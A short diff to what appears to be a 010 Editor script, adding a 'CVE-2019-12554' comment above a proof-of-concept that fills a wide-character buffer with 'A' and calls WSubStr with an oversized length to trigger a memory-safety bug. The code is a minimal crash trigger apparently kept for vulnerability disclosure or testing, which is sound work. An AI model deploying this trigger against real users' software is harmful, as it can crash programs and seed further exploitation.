@@ -10,6 +10,9 @@
 //  ID Bytes: 
 //   History: 
 //------------------------------------------------
+
+// CVE-2019-12554
+
 local wchar_t a[0x100];
 WMemset(a, 'A', sizeof(a));
 WSubStr(a, 0x99, 0x7ffffff0);
